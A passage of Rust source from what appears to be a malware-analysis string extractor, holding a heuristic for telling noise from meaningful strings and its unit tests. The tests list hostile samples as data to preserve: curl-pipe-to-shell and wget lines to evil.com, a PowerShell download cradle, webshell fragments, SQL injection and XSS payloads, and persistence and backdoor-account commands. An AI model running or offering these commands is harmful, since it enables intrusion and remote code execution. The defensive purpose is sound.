        if hex_count * 100 / len > MIN_HEX_RATIO_FOR_HASH {
            return true;
        }
    }

    // Locale codes
    if is_locale_code(s, len) {
        return true;
    }

    // XML/plist tags
    if s.starts_with('<') && s.ends_with('>') && len >= 3 {
        let inner = &s[1..len - 1];
        let is_valid_tag = inner.chars().all(|c| c.is_alphanumeric() || c == '/');
        if is_valid_tag && !inner.is_empty() {
            return true;
        }
    }

    // Shell commands with redirections/heredocs
    if s.contains("2>&1")
        || s.contains("2>")
        || s.contains("<<")
        || (s.contains(" > ") && s.split_whitespace().count() >= MIN_SEGMENT_COUNT)
    {
        let alnum_count = s.bytes().filter(u8::is_ascii_alphanumeric).count();
        let ascii_chars = s.bytes().filter(u8::is_ascii).count();
        let char_count = s.chars().count();
        if alnum_count >= 3
            && char_count > 0
            && ascii_chars * 100 / char_count > MIN_FAST_PATH_ALPHABETIC_RATIO
        {
            return true;
        }
    }

    false
}

/// Perform statistical analysis to determine if string is garbage.
///
/// This is the fallback when fast paths and IOC recognition don't apply.
fn is_statistical_garbage(s: &str, len: usize, stats: &CharStats) -> bool {
    // Short pattern checks
    if is_short_identifier_garbage(s, len, stats) {
        return true;
    }

    // Repeating digit patterns like "537353W353" - digits repeat in a pattern with few letters
    // Exception: hex addresses like "0x12345678" are valid
    if len >= 8 && stats.digit >= 6 && stats.alpha <= 2 {
        let is_hex_address = s.starts_with("0x") || s.starts_with("0X");
        if !is_hex_address {
            return true;
        }
    }

    // Short strings (4-10 chars) with mixed case and digits that don't look like identifiers
    // e.g., "gvjc54" - lowercase + digit but no vowels and doesn't follow naming conventions
    if (4..=10).contains(&len) && stats.lower > 0 && stats.digit > 0 && stats.upper == 0 {
        let vowel_count = s
            .bytes()
            .filter(|&b| matches!(b, b'a' | b'e' | b'i' | b'o' | b'u'))
            .count();
        // If no vowels and has digits embedded in lowercase, likely garbage
        if vowel_count == 0 && stats.lower >= 3 && stats.digit >= 1 {
            return true;
        }
    }

    // Short all-lowercase strings (4-5 chars) that don't look like real words
    // e.g., "oujr", "omor", "kmnro" - unusual phonotactic patterns
    if (4..=5).contains(&len) && stats.lower == len && stats.digit == 0 && stats.upper == 0 {
        let vowel_count = s
            .bytes()
            .filter(|&b| matches!(b, b'a' | b'e' | b'i' | b'o' | b'u'))
            .count();

        // No vowels at all - likely random garbage
        if vowel_count <= 1 {
            // Whitelist common short words/abbreviations
            let known_short = [
                "init", "main", "type", "file", "func", "data", "test", "temp", "code", "info",
                "user", "node", "sync", "async", "true", "null", "void", "char", "bool", "time",
                "size", "path", "name", "text",
            ];
            if !known_short.contains(&s) {
                return true;
            }
        }

        // Unusual patterns: starts with vowel followed by unusual consonant combinations
        // e.g., "oujr", "omor" - vowel followed by uncommon consonant clusters
        if stats.first_char == 'o' || stats.first_char == 'u' {
            // Check if it follows typical English patterns
            let chars: Vec<char> = s.chars().collect();
            if chars.len() == 4 {
                // 4-char words starting with o/u are suspicious - whitelist known ones
                let known_ou_4char = [
                    "open", "over", "only", "once", "used", "upon", "unit", "user", "undo", "unix",
                    "okay", "oral", "opus",
                ];
                if !known_ou_4char.contains(&s) {
                    return true;
                }
            } else if chars.len() == 5 {
                // 5-char words starting with o/u - also whitelist
                let known_ou_5char = [
                    "other", "order", "offer", "under", "until", "using", "usual", "opera",
                    "outer", "owner", "union",
                ];
                if !known_ou_5char.contains(&s) {
                    // Check for common suffix patterns
                    let ends_like_word = s.ends_with("er")
                        || s.ends_with("ed")
                        || s.ends_with("ly")
                        || s.ends_with("al")
                        || s.ends_with("le")
                        || s.ends_with("en")
                        || s.ends_with("es");
                    if !ends_like_word {
                        return true;
                    }
                }
            }
        }
    }

    // Strings with multiple consecutive quotes are likely misaligned data
    if s.contains("\"\"") || s.contains("'''") {
        return true;
    }

    // Note: Short digit+uppercase 4-char patterns like "8BIM", "0GZF" are often legitimate
    // identifiers (file signatures, codes). We don't filter them to avoid false positives.
    // is_short_identifier_garbage already handles these via is_digit_upper_id check.

    // Short all-uppercase strings (4 chars) with repeated characters are usually garbage
    // e.g., "ZYII", "ABCC" - unless they're known abbreviations
    if len == 4 && stats.upper == len && stats.digit == 0 {
        let chars: Vec<char> = s.chars().collect();
        // Check for doubled characters at end (common in garbage)
        if chars[2] == chars[3] {
            // Whitelist known abbreviations with doubled chars
            let known_doubled = ["IEEE", "COMM", "AABB", "CFFF"];
            if !known_doubled.contains(&s) {
                return true;
            }
        }
    }

    // Very short strings (4 chars) with lowercase + single digit at end
    // e.g., "kmo8", "abc1" - unless it follows naming conventions or is known
    if len == 4 && stats.lower >= 2 && stats.digit == 1 && stats.upper == 0 {
        let vowel_count = s
            .bytes()
            .filter(|&b| matches!(b, b'a' | b'e' | b'i' | b'o' | b'u'))
            .count();
        // If has 0-1 vowels and ends with digit, likely garbage
        if vowel_count <= 1 && stats.last_char.is_ascii_digit() {
            // Whitelist known patterns (encoding, crypto, architecture suffixes)
            let known_4char_suffix = ["sha1", "md5", "utf8", "mp3", "mp4", "avi"];
            if !known_4char_suffix.iter().any(|k| s.eq_ignore_ascii_case(k)) {
                return true;
            }
        }
    }

    // Very short all-digit strings (4-5 chars) with very limited variety are usually garbage
    // e.g., "3333", "1111" - unless they're port numbers, years, or known patterns
    if (4..=5).contains(&len) && stats.digit == len && stats.upper == 0 && stats.lower == 0 {
        let chars: Vec<char> = s.chars().collect();
        // Check for year-like patterns (19xx, 20xx)
        if chars.len() == 4 {
            let first_two: String = chars[0..2].iter().collect();
            if first_two == "19" || first_two == "20" {
                // Likely a year - don't filter
            } else {
                // Only filter if ALL digits are the same (e.g., "3333", "1111")
                let unique_digits: std::collections::HashSet<_> = chars.iter().collect();
                if unique_digits.len() == 1 {
                    return true;
                }
            }
        }
    }

    // Short strings with noise punctuation are garbage
    if len <= 10 && stats.noise_punct > 0 {
        return true;
    }

    // Trailing spaces after short content indicate misaligned reads
    if s.ends_with(' ') && len < 10 && stats.alphanumeric < 4 {
        return true;
    }

    // Pattern: ends with backtick + single letter (Go misaligned reads)
    let bytes = s.as_bytes();
    if len >= MIN_SEGMENT_COUNT {
        if let Some(idx) = bytes.iter().rposition(|&b| b.is_ascii_alphabetic()) {
            if idx > 0 && bytes[idx - 1] == b'`' {
                return true;
            }
        }
    }

    if len <= 4 && stats.alphanumeric < len / 2 {
        return true;
    }

    if len <= 8 && (stats.open_parens != stats.close_parens || stats.quotes == 1) {
        return true;
    }

    if is_short_binary_garbage(s, len, stats) {
        return true;
    }

    // Medium-length strings with mixed case and digits are noise from compressed data
    if (MIXED_CASE_DIGIT_MIN_LEN..=MIXED_CASE_DIGIT_MAX_LEN).contains(&len)
        && stats.digit > 0
        && stats.upper > 0
        && stats.lower > 0
    {
        let looks_like_version =
            s.starts_with("go") || s.starts_with('v') || s.starts_with('V') || s.contains('.');
        if !looks_like_version {
            return true;
        }
    }

    // Consistent-case alphanumeric patterns (7-8 chars) are valid identifiers
    // e.g., "UTF16LE", "BASE64" - patterns like encoding names, algorithms
    // Reject alternating patterns like "0a1b2c3d" (too many transitions)
    // Reject single leading 0 or 1 (unusual in real identifiers)
    // (4-6 char patterns are handled by is_short_identifier_garbage)
    let chars: Vec<char> = s.chars().collect();
    let has_suspicious_leading_digit = (stats.first_char == '0' || stats.first_char == '1')
        && chars.len() > 1
        && !chars[1].is_ascii_digit();
    // Valid identifiers are ASCII-only, so check ascii_count == len
    let is_all_ascii = stats.ascii_count == len;
    if (7..=8).contains(&len)
        && is_all_ascii
        && stats.special == 0
        && stats.digit > 0
        && stats.alpha > 0
        && (stats.lower == 0 || stats.upper == 0)
        && !(stats.first_char.is_ascii_digit() && stats.last_char.is_ascii_digit())
        && !has_suspicious_leading_digit
        && stats.alternations < 4
    // Reject highly alternating patterns
    {
        return false; // Valid identifier pattern
    }

    if len >= 4 && stats.alphanumeric == 0 {
        return true;
    }

    if len >= MIN_CHAOTIC_PATTERN_LENGTH
        && stats.digit > 0
        && stats.alpha > 0
        && stats.alternations >= MIN_TRANSITIONS_FOR_CHAOS
        && stats.alternations * 2 >= len
    {
        return true;
    }

    if stats.char_count > MIN_CHAOTIC_PATTERN_LENGTH
        && stats.alphanumeric * 100 / stats.char_count < MIN_ALPHANUMERIC_RATIO
    {
        return true;
    }

    // Random hex/binary data (all hex chars, no non-hex letters, not prefixed 0x)
    if len >= 8
        && !stats.has_non_hex_letter
        && stats.hex_only == len
        && stats.digit > 0
        && stats.alpha > 0
        && !s.contains('.')
        && !s.starts_with("0x")
    {
        return true;
    }

    if len >= 4 && stats.all_same {
        return true;
    }

    if stats.whitespace > 0 && stats.whitespace * 100 / len > MAX_WHITESPACE_RATIO {
        return true;
    }

    if has_excess_non_ascii(s, len, stats) {
        return true;
    }

    // Short strings ending with unusual unicode are suspicious
    if !stats.last_char.is_ascii() && len < 15 && stats.alphanumeric < len / 2 {
        return true;
    }

    // Obfuscated Python: mangled identifiers (llIIlIl...) with Python keywords
    if (s.contains("def ")
        || s.contains("return ")
        || s.contains("import ")
        || s.contains(".replace("))
        && len >= 20
    {
        let has_many_identifiers = stats.upper > 5 && stats.lower > 5;
        let has_reasonable_alnum = stats.alphanumeric >= 12;
        if has_many_identifiers && has_reasonable_alnum {
            return false;
        }
    }

    if has_chaotic_char_pattern(s, len, stats) {
        return true;
    }

    // All-ASCII reloc table patterns (checked separately since has_excess_non_ascii skips ASCII)
    if is_reloc_table_pattern(s, len) {
        return true;
    }

    false
}

/// This heuristic detects common patterns of misaligned reads and low-value strings:
/// - Short strings with non-alphanumeric characters
/// - Strings ending with backtick + letter + spaces (misaligned Go data)
/// - Strings with very low alphanumeric ratio
/// - Strings that are mostly whitespace padding
/// - Strings with embedded null or control characters
pub fn is_garbage(s: &str) -> bool {
    let trimmed = s.trim();
    let len = trimmed.len();

    // Fast path: obvious valid strings
    if is_fast_path_valid(trimmed, len) {
        return false;
    }

    // Fast path: obvious garbage
    if is_fast_path_garbage(trimmed, s, len) {
        return true;
    }

    // Known IOC patterns (malware indicators, crypto, auth tokens, etc.)
    if is_recognized_ioc(trimmed, len) {
        return false;
    }

    // Statistical analysis (character distribution, patterns, transitions)
    let stats = CharStats::from_str(trimmed);
    is_statistical_garbage(trimmed, len, &stats)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_garbage_valid_strings() {
        // Valid strings should NOT be garbage
        assert!(!is_garbage("Hello World"));
        assert!(!is_garbage("go1.22.0"));
        assert!(!is_garbage("/usr/lib/go"));
        assert!(!is_garbage("runtime.memequal"));
        assert!(!is_garbage("SIGFPE: floating-point exception"));
        assert!(!is_garbage("Bool"));
        assert!(!is_garbage("Time"));
        assert!(!is_garbage("linux"));
        assert!(!is_garbage("amd64"));
        assert!(!is_garbage("https://example.com"));
        assert!(!is_garbage("ERROR_CODE_123"));
    }

    #[test]
    fn test_is_garbage_jpeg_metadata() {
        // JPEG/image metadata strings should NOT be garbage
        assert!(!is_garbage("JFIF"));
        assert!(!is_garbage("Photoshop 3.0"));
        assert!(!is_garbage("8BIM")); // Photoshop resource marker
        assert!(!is_garbage("Exif"));
        assert!(!is_garbage("cph/3c13276u.tif"));
        assert!(!is_garbage("1998:12:15 13:03:34"));
        assert!(!is_garbage("Library of Congress"));
        // JPEG quantization table character sequence
        assert!(!is_garbage("%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz"));
    }

    #[test]
    fn test_is_garbage_misaligned_go_reads() {
        // Misaligned Go data patterns should be garbage
        assert!(is_garbage("asL "));
        assert!(is_garbage("``L "));
        assert!(is_garbage("dL "));
        assert!(is_garbage("7aL "));
        assert!(is_garbage("`L "));
        assert!(is_garbage("D`L  "));
        assert!(is_garbage("~dL  "));
        assert!(is_garbage("#uL  "));
        assert!(is_garbage("gkL     @M"));
    }

    #[test]
    fn test_is_garbage_short_binary_patterns() {
        // Short strings that look like misaligned binary data
        assert!(is_garbage("PuO#"));
        assert!(is_garbage("P9O"));
        assert!(is_garbage("8ZAj"));
        assert!(is_garbage("pIo2")); // mixed case + digit = garbage
                                     // Note: "PIO2" (3 upper + 1 digit) is now accepted as it matches
                                     // common patterns like "UTF8", "SHA1", "3DES" (file sigs, algorithms)
        assert!(!is_garbage("PIO2"));
        assert!(is_garbage("@E?"));
        assert!(is_garbage("P$O"));
        assert!(is_garbage("0Y/("));
        assert!(is_garbage("UoV#"));
        assert!(is_garbage("1j2`1r2l1128"));
        // JPEG/binary compressed data patterns
        assert!(is_garbage("Gi4r"));
        assert!(is_garbage("Uim0"));
        assert!(is_garbage("Ilu4")); // mixed case with digit
        assert!(is_garbage("cwZd")); // mixed case
                                     // Consistent case alphanumeric patterns are accepted if they look like real identifiers
        assert!(!is_garbage("9N2A")); // all uppercase + digits, leading 9 = valid
        assert!(is_garbage("0YI0")); // digits at BOTH ends = garbage
        assert!(is_garbage("0GZF")); // single leading 0 = garbage
        assert!(is_garbage("1ABC")); // single leading 1 = garbage
        assert!(is_garbage("8oz1")); // mixed case (upper and lower) = garbage
        assert!(is_garbage("gnzUrs")); // mixed case = garbage
                                       // Note: "3OEP" looks like "8BIM" (digit + uppercase), can't distinguish without whitelist
                                       // Short strings with internal spaces
        assert!(is_garbage("5c 9"));
        assert!(is_garbage("VW N"));
        // But all-uppercase, all-lowercase, or all-numeric are OK
        assert!(!is_garbage("PFO"));
        assert!(!is_garbage("API"));
        assert!(!is_garbage("foo"));
        assert!(!is_garbage("1234"));
    }

    #[test]
    fn test_is_garbage_short_nonalpha() {
        // Short strings with mostly non-alphanumeric
        assert!(is_garbage("@#$%"));
        assert!(is_garbage("!!!"));
        assert!(is_garbage("   "));
        assert!(is_garbage(""));
    }

    #[test]
    fn test_is_garbage_repeated_chars() {
        // Single repeated characters
        assert!(is_garbage("aaaa"));
        assert!(is_garbage("...."));
        assert!(is_garbage("----"));
    }

    #[test]
    fn test_is_garbage_unicode_endings() {
        // Short strings with non-ASCII unicode at the end
        assert!(is_garbage("333333ӿ"));
        assert!(is_garbage("abcӿ"));
    }

    #[test]
    fn test_is_garbage_control_chars() {
        // Strings with control characters
        assert!(is_garbage("ab\x00cd"));
        assert!(is_garbage("\x01\x02\x03"));
    }

    #[test]
    fn test_is_garbage_single_char() {
        assert!(is_garbage("a"));
        assert!(is_garbage("X"));
        assert!(is_garbage("1"));
    }

    #[test]
    fn test_is_garbage_alternating_pattern() {
        // Alternating digit-letter patterns
        assert!(is_garbage("1a2b3c4d5e"));
    }

    #[test]
    fn test_is_garbage_low_alphanum_ratio() {
        // Less than 30% alphanumeric for strings > 6 chars
        assert!(is_garbage("....!!!!"));
    }

    #[test]
    fn test_is_garbage_unbalanced_parens() {
        assert!(is_garbage("ab(cd"));
        assert!(is_garbage("ab[cd"));
    }

    #[test]
    fn test_is_garbage_single_quote() {
        assert!(is_garbage("ab'cd"));
    }

    #[test]
    fn test_is_garbage_trailing_newline_ok() {
        // Trailing newline should not trigger control char detection
        assert!(!is_garbage("hello world\n"));
    }

    #[test]
    fn test_is_garbage_short_strings_with_dots() {
        // Short strings with dots should not be automatically marked as garbage
        // These are common in filenames and section names
        assert!(!is_garbage("d.exe"), "d.exe should not be garbage");
        assert!(!is_garbage(".blah"), ".blah should not be garbage");
        assert!(!is_garbage("a.out"), "a.out should not be garbage");
        assert!(!is_garbage("lib.so"), "lib.so should not be garbage");

        // Section names specifically (starts with dot)
        assert!(!is_garbage(".text"), ".text should not be garbage");
        assert!(!is_garbage(".data"), ".data should not be garbage");
        assert!(!is_garbage(".bss"), ".bss should not be garbage");
    }

    #[test]
    fn test_is_garbage_base64_strings() {
        // Base64 strings should NOT be garbage
        assert!(!is_garbage("VGhpcyBpcyBhIHNlY3JldCBtZXNzYWdl"));
        assert!(!is_garbage("SGVsbG8gV29ybGQh"));
        assert!(!is_garbage("YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo="));
    }

    #[test]
    fn test_is_garbage_obfuscated_javascript() {
        // Obfuscated JavaScript with hex identifiers should NOT be garbage
        // This is common in malware and should be preserved for analysis
        let test_cases = vec![
            ("const _0x1c1000=_0x230d;", "simple const assignment"),
            ("const _0x1c1000=_0x230d;function _0x230d(_0x996a22,_0x589a56){const _0x11053a=_0x1105();return _0x230d=function(_0x2", "full obfuscated code"),
            ("function _0x230d(_0x996a22,_0x589a56)", "function declaration"),
            ("const _0x1c1000=_0x230d", "const without semicolon"),
            ("_0x230d(_0x996a22,_0x589a56)", "function call"),
            ("return _0x230d", "return statement"),
            ("var _0x4a5b=['base64','encode','decode']", "var with array"),
            ("if(_0x1a2b3c===_0x4d5e6f)", "if statement"),
            ("_0x123abc[_0x456def(0x0)]", "array access"),
        ];

        for (s, desc) in test_cases {
            let result = is_garbage(s);
            assert!(
                !result,
                "Obfuscated JavaScript should NOT be garbage: {} - got is_garbage={}",
                desc, result
            );
        }
    }

    #[test]
    fn test_is_garbage_shell_shebangs_and_options() {
        // Shebang lines and shell command options should NOT be garbage
        assert!(!is_garbage("#!/bin/sh -eux -o p"));
        assert!(!is_garbage("#!/bin/bash"));
        assert!(!is_garbage("#!/usr/bin/env python3"));
        assert!(!is_garbage("sh -c 'command'"));
        assert!(!is_garbage("bash -eux"));
        assert!(!is_garbage("/bin/sh -e"));
    }

    #[test]
    fn test_is_garbage_obfuscated_python() {
        // Obfuscated Python with mangled identifiers should NOT be garbage
        assert!(!is_garbage("def llIIlIlllllIIlllII(lllIllllIIIllIllII):"));
        assert!(!is_garbage("lllllIIIIlllllIlII=IIllIlI.IllIllIllIllllIIlIIlIllIl();llIIIIIllllIllIlII=lilIIlI.IllIllIllIllllIIlIIlIllIl();llIlIIIIIIIIllIIlI=lIllIlIlIIIlIIIlII.IllIIlIIlllIIIIlIlIIllIII(lllllIIIIlllllIlII,llIIIIIllllIllIlII)"));
        assert!(!is_garbage("return llIIIIIlIllIllIlIl(lllIllllIIIllIllII.IllllIIllllIIIIIIlIIlIIII(llIlIIIIIIIIllIIlI)).IlIlIlIlIIIIlIllIllllllII()"));
        assert!(!is_garbage("lIlIlIlIIIlIllllll(IIlIlIIIlIIIIlIIIl(IllIllIlIIIlllllII(llIIlIlllllIIlllII(lIlllllIl)),llIIlIlllllIIlllII(lIIIIIlI))(lIllIlIlIIIlIIIlII.IlIIIllIIIIlllIIIlllIlIll(lIlIIIlIlIIIlI.replace"));
    }

    #[test]
    fn test_is_garbage_malware_iocs() {
        // IOCs commonly found in malware should NOT be garbage

        // MAC addresses
        assert!(!is_garbage("00:1A:2B:3C:4D:5E"), "MAC address colon format");
        assert!(!is_garbage("00-1A-2B-3C-4D-5E"), "MAC address dash format");
        assert!(!is_garbage("001A.2B3C.4D5E"), "MAC address Cisco format");

        // IPv6 addresses
        assert!(
            !is_garbage("2001:0db8:85a3:0000:0000:8a2e:0370:7334"),
            "IPv6 full"
        );
        assert!(
            !is_garbage("2001:db8:85a3::8a2e:370:7334"),
            "IPv6 compressed"
        );
        assert!(!is_garbage("::1"), "IPv6 loopback");
        assert!(!is_garbage("fe80::1"), "IPv6 link-local");
        assert!(!is_garbage("2001:db8::192.0.2.1"), "IPv6 with IPv4");

        // Crypto keys and hashes (RC4, AES, etc.)
        assert!(!is_garbage("5f4dcc3b5aa765d61d8327deb882cf99"), "MD5 hash");
        assert!(
            !is_garbage("2fd4e1c67a2d28fced849ee1bb76e7391b93eb12"),
            "SHA1 hash"
        );
        assert!(
            !is_garbage("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"),
            "SHA256 hash"
        );
        assert!(!is_garbage("DEADBEEF1234567890ABCDEF"), "Hex key");

        // Comma-delimited locale/language values
        assert!(!is_garbage("en_US,en,en_GB,fr_FR,de_DE"), "Locale list");
        assert!(!is_garbage("en-US,zh-CN,ja-JP,ko-KR"), "Language codes");
        assert!(
            !is_garbage("UTF-8,ISO-8859-1,ASCII,UTF-16"),
            "Encoding list"
        );

        // Obfuscated code patterns - C
        assert!(
            !is_garbage("char *p=((char*)0x41414141);"),
            "C pointer obfuscation"
        );
        assert!(!is_garbage("__attribute__((constructor))"), "C attribute");
        assert!(!is_garbage("#define XOR(a,b) ((a)^(b))"), "C macro");

        // Obfuscated code patterns - PHP
        assert!(
            !is_garbage("eval(base64_decode('SGVsbG8='));"),
            "PHP eval base64"
        );
        assert!(!is_garbage("${'GLOBALS'}['_GET']"), "PHP dynamic globals");
        assert!(
            !is_garbage("${$_GET['x']}($_POST['y']);"),
            "PHP variable variables"
        );
        assert!(
            !is_garbage("preg_replace('/e/e','system($_GET[c])','');"),
            "PHP preg_replace /e"
        );

        // Obfuscated code patterns - Perl
        assert!(
            !is_garbage("eval(pack('H*','48656c6c6f'));"),
            "Perl eval pack"
        );
        assert!(!is_garbage("system($ARGV[0]);"), "Perl system call");
        assert!(!is_garbage("open(F,'|/bin/sh');"), "Perl pipe open");

        // Obfuscated code patterns - Shell
        assert!(
            !is_garbage("eval $(echo SGVsbG8K|base64 -d)"),
            "Shell eval base64"
        );
        assert!(
            !is_garbage("sh -c 'curl http://evil.com|sh'"),
            "Shell curl pipe"
        );
        assert!(
            !is_garbage("${IFS}cat${IFS}/etc/passwd"),
            "Shell IFS obfuscation"
        );

        // Network indicators
        assert!(!is_garbage("Host: evil.com:8080"), "HTTP host header");
        assert!(!is_garbage("User-Agent: Mozilla/5.0"), "HTTP user agent");
        assert!(
            !is_garbage("Content-Type: application/x-www-form-urlencoded"),
            "HTTP content type"
        );
    }

    #[test]
    fn test_is_garbage_non_ascii_strings() {
        // Strings with excessive non-ASCII characters should be garbage
        let test_cases = vec![
            ("/º ¸`¨wl½¶ zmNy", "Path with non-ASCII chars"),
            ("cyl}´á!Qñ#´{ûNy1", "Random with non-ASCII chars"),
            ("CMQpç+9¥g½Ñãiq¸¹:î¦»ölX²", "Long string with non-ASCII"),
            ("?ÔTlbxbµ¥äèêæ", "Short string with non-ASCII"),
            ("ÉBXAÕhDqÌuyóÉµ", "Mixed with non-ASCII"),
            ("ùÉÜÔrzAyÀµCLYìÐ", "Random non-ASCII"),
            ("ë9[R.-XK3`o3ú¼ÁOY", "Special chars with non-ASCII"),
            ("rL*>@«ßtS·` tNV°}*¸", "Symbols with non-ASCII"),
            ("Yapt3OJÃÚ'µ£¦¯È", "Mixed case with non-ASCII"),
            ("`C dJe`eN{Û", "Backtick with non-ASCII"),
        ];

        for (s, desc) in test_cases {
            if !is_garbage(s) {
                eprintln!(
                    "FAILED: {} - String: {:?}, len={}, chars={}",
                    desc,
                    s,
                    s.len(),
                    s.chars().count()
                );
            }
            assert!(is_garbage(s), "{}", desc);
        }
    }

    #[test]
    fn test_is_garbage_literal_escape_sequences() {
        // Strings with literal \x escape sequences (not in code context) are garbage
        assert!(
            is_garbage("RFXA-\\xU*^$U"),
            "Literal \\x escape outside code"
        );
        assert!(is_garbage("foo\\x41bar"), "Literal \\x in string");

        // But these should NOT be garbage (code context)
        assert!(
            !is_garbage("print \"\\x41\\x42\\x43\""),
            "Code with escape sequences"
        );
        assert!(
            !is_garbage("echo '\\x48\\x65\\x6c\\x6c\\x6f'"),
            "Shell with escapes"
        );
    }

    #[test]
    fn test_is_garbage_ransomware_and_ctf_iocs() {
        // IOCs commonly found in ransomware and CTF challenges should NOT be garbage

        // Cryptocurrency wallet addresses
        assert!(
            !is_garbage("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"),
            "Bitcoin address (legacy)"
        );
        assert!(
            !is_garbage("3J98t1WpEZ73CNmYviecrnyiWrnqRhWNLy"),
            "Bitcoin address (P2SH)"
        );
        assert!(
            !is_garbage("bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"),
            "Bitcoin address (bech32)"
        );
        assert!(
            !is_garbage("0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb"),
            "Ethereum address"
        );
        assert!(!is_garbage("44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A"), "Monero address");
        assert!(
            !is_garbage("LdP8Qox1VAhCzLJNqrqPRHWXpnRAjRUa4L"),
            "Litecoin address"
        );
        assert!(
            !is_garbage("DH5yaieqoZN36fDVciNyRueRGvGLR3mr7L"),
            "Dogecoin address"
        );

        // Cryptocurrency mining pools and stratum URLs
        assert!(!is_garbage("pool.minexmr.com:4444"), "Monero mining pool");
        assert!(!is_garbage("xmr-eu1.nanopool.org:14444"), "Nanopool XMR");
        assert!(
            !is_garbage("eth-us-east1.nanopool.org:9999"),
            "Nanopool ETH"
        );
        assert!(
            !is_garbage("stratum+tcp://pool.supportxmr.com:3333"),
            "Stratum URL"
        );
        assert!(
            !is_garbage("stratum+ssl://xmr.pool.minergate.com:45700"),
            "Stratum SSL"
        );

        // Cryptocurrency miner software names and commands
        assert!(!is_garbage("xmrig"), "XMRig miner");
        assert!(!is_garbage("xmr-stak"), "XMR-Stak miner");
        assert!(!is_garbage("cpuminer-multi"), "CPU miner");
        assert!(!is_garbage("ccminer"), "CUDA miner");
        assert!(!is_garbage("ethminer"), "Ethereum miner");
        assert!(!is_garbage("PhoenixMiner"), "Phoenix miner");
        assert!(!is_garbage("t-rex"), "T-Rex miner");
        assert!(!is_garbage("--donate-level=1"), "Miner donate flag");
        assert!(
            !is_garbage("-o pool.minexmr.com:4444 -u"),
            "Miner command line"
        );
        assert!(!is_garbage("--algo=cryptonight"), "Mining algorithm");
        assert!(!is_garbage("--cuda-devices=0,1"), "GPU device selection");

        // Tor/Onion URLs (common in ransomware)
        assert!(!is_garbage("http://thehiddenwiki.onion"), "Onion URL HTTP");
        assert!(
            !is_garbage("https://3g2upl4pq6kufc4m.onion"),
            "Onion URL DuckDuckGo"
        );
        assert!(!is_garbage("ransomware2x4ytmz.onion"), "Onion domain only");

        // CTF flag formats
        assert!(!is_garbage("CTF{th1s_1s_4_fl4g}"), "CTF flag format");
        assert!(
            !is_garbage("flag{base64_encoded_secret}"),
            "flag{{}} format"
        );
        assert!(
            !is_garbage("picoCTF{b1n4ry_3xpl01t4t10n}"),
            "picoCTF format"
        );
        assert!(!is_garbage("HTB{h4ck_th3_b0x}"), "HackTheBox format");
        assert!(!is_garbage("FLAG{SQL_1nj3ct10n_pwn3d}"), "FLAG{{}} format");

        // Email addresses (used in ransomware contact)
        assert!(!is_garbage("decrypt@protonmail.com"), "Ransomware email");
        assert!(!is_garbage("recover.files@tutanota.com"), "Recovery email");
        assert!(!is_garbage("unlock_data@cock.li"), "Contact email");

        // Ransomware file extensions
        assert!(!is_garbage(".locked"), "Locked extension");
        assert!(!is_garbage(".encrypted"), "Encrypted extension");
        assert!(!is_garbage(".crypted"), "Crypted extension");
        assert!(!is_garbage(".wannacry"), "WannaCry extension");
        assert!(!is_garbage(".ryuk"), "Ryuk extension");
        assert!(!is_garbage(".locky"), "Locky extension");

        // Mutex/synchronization names (often weird strings)
        assert!(
            !is_garbage("Global\\MsWinZonesCacheCounterMutexA"),
            "Windows mutex"
        );
        assert!(
            !is_garbage("{8F6F0AC4-B9A1-45fd-A8CF-72997C3991B}"),
            "GUID mutex"
        );

        // Windows registry paths
        assert!(
            !is_garbage("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
            "Registry run key"
        );
        assert!(
            !is_garbage("HKCU\\Software\\Classes\\exefile\\shell\\open\\command"),
            "Registry exefile"
        );

        // SQL injection payloads (CTF/pentesting)
        assert!(!is_garbage("' OR '1'='1"), "SQL injection basic");
        assert!(!is_garbage("admin'--"), "SQL comment injection");
        assert!(
            !is_garbage("1' UNION SELECT NULL,NULL,NULL--"),
            "SQL union injection"
        );

        // XSS payloads
        assert!(!is_garbage("<script>alert(1)</script>"), "XSS basic");
        assert!(!is_garbage("<img src=x onerror=alert(1)>"), "XSS img tag");
        assert!(
            !is_garbage("javascript:alert(document.cookie)"),
            "XSS javascript protocol"
        );

        // Command injection patterns
        assert!(
            !is_garbage("; cat /etc/passwd"),
            "Command injection semicolon"
        );
        assert!(!is_garbage("| whoami"), "Command injection pipe");
        assert!(!is_garbage("`id`"), "Command injection backticks");
        assert!(
            !is_garbage("$(wget http://evil.com/shell.sh)"),
            "Command injection wget"
        );

        // Persistence mechanisms
        assert!(
            !is_garbage("schtasks /create /tn \"WindowsUpdate\" /tr"),
            "Scheduled task"
        );
        assert!(
            !is_garbage("net user hacker password123 /add"),
            "User creation"
        );
        assert!(
            !is_garbage("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
            "Registry persistence"
        );

        // Common malware/CTF tools signatures
        assert!(!is_garbage("powershell -enc"), "PowerShell encoded");
        assert!(
            !is_garbage("IEX(New-Object Net.WebClient).DownloadString"),
            "PowerShell download"
        );
        assert!(
            !is_garbage("certutil -urlcache -split -f"),
            "Certutil download"
        );
        assert!(
            !is_garbage("mshta http://evil.com/payload.hta"),
            "Mshta execution"
        );

        // JWT tokens (common in web CTFs)
        assert!(!is_garbage("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"), "JWT token");

        // RSA/PEM keys (truncated for test)
        assert!(!is_garbage("-----BEGIN PUBLIC KEY-----"), "PEM header");
        assert!(!is_garbage("-----END PRIVATE KEY-----"), "PEM footer");
        assert!(
            !is_garbage("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA"),
            "RSA key data"
        );

        // Ransom note patterns
        assert!(
            !is_garbage("YOUR FILES HAVE BEEN ENCRYPTED"),
            "Ransom message"
        );
